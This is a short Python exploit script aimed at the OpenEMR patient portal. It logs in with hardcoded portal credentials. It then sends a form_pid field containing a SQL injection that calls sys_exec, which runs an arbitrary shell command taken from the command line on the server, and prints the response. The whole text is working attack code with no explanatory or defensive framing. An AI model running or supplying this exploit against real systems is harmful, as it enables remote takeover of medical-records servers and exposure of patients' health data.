import requests
import time
import sys

if len(sys.argv) != 4:
    print('%s <ip> <port> <cmd>')
    sys.exit(-1)

host = sys.argv[1]
port = sys.argv[2]
cmd  = sys.argv[3]

s = requests.Session()
#get cookies
#cookies = s.get("http://%s:%s/openemr/portal/index.php" %(host, port)).cookies.get_dict()
s.get("http://%s:%s/openemr/portal/index.php" %(host, port))

#login
username  = "user1"
password = "pass1"
email  = "user@user.com"
url = "http://%s:%s/openemr/portal/get_patient_info.php" % (host, port)
data= {
	'uname' : username,
	'pass' : password,
	'passaddon' : email,
	'languageChoice' : '1',
    }

req = s.post(url, data=data)

# GO
url = "http://%s:%s/openemr/portal/lib/paylib.php" % (host, port)
data = {'mode': 'portal-save',
        'form_pid': "1 OR (SELECT(sys_exec('%s')))" % cmd,
        'form_method': 'b',
        'form_source': 'c',
        'extra_values': 'xxx'
        }
req = s.post(url, data = data)
print(req.text)
